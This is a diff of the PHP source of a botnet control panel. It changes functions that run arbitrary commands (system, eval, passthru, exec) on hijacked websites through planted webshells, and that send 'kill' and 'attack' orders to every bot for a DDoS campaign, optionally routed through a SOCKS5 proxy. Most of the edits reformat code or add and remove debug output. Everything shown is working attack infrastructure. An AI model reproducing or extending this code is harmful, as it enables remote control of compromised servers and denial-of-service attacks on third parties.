@@ -433,7 +433,6 @@ function rce()
 	if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
 		$check = mysqli_query($conn, "SELECT * FROM `bots` WHERE `id` = " . mysql_escape_string($_POST['id']) . " LIMIT 1");
 		$row = mysqli_fetch_array($check);
-		echo $row[0], $row[1], $row[2];
 			if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
 				echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
 				echo '<p class="meta">' . $row['url'] . '?_=' . htmlspecialchars($_POST['func']) . '&__=' . htmlspecialchars($_POST['cmd']) . '</p>';
@@ -726,48 +725,49 @@ function ddos() {
 
     if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {
 
-$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+		$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+		$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
 
-$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
+		if($_POST['sup'] == 'kill') {
+			$x = 0;
+			while($row = mysqli_fetch_assoc($rows)) {
 
-if($_POST['sup'] == 'kill') {
-$x = 0;
-while($row = mysqli_fetch_assoc($rows)) {
-
-$source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
-$x++;
-$ch = curl_init();
-if(USE_PROXY == 1) {
-$curlConfig = array(
-    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
-    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
-    CURLOPT_URL            => $row['url'],
-    CURLOPT_POST           => true,
-    CURLOPT_POSTFIELDS     => array(
-        'kill' => '1'
-    )
-);
-} else {
-$curlConfig = array(
-    CURLOPT_URL            => $row['url'],
-    CURLOPT_POST           => true,
-    CURLOPT_POSTFIELDS     => array(
-        'kill' => '1'
-    )
-);
-}
-curl_setopt_array($ch, $curlConfig);
-$result = curl_exec($ch);
-curl_close($ch);
-}
-}
-echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';
+				$source = conn($row['url'].'?_=system&__=uname');
+				if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
+					$x++;
+					$ch = curl_init();
+					
+					if(USE_PROXY == 1) {
+						$curlConfig = array(
+    					CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
+    					CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
+    					CURLOPT_URL            => $row['url'],
+    					CURLOPT_POST           => true,
+    					CURLOPT_POSTFIELDS     => array(
+        				'kill' => '1'
+    					)
+					);
+				} else {
+					$curlConfig = array(
+    				CURLOPT_URL            => $row['url'],
+    				CURLOPT_POST           => true,
+    				CURLOPT_POSTFIELDS     => array(
+        			'kill' => '1'
+    				)
+				);
+			}
+		curl_setopt_array($ch, $curlConfig);
+		$result = curl_exec($ch);
+		curl_close($ch);
+		}
+	}
+	
+	echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';
 
         } elseif($_POST['sup'] == 'attack') {
             $y = 0;
             while($row = mysqli_fetch_assoc($rows)) {
-
+	echo "Ciao";
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $y++;
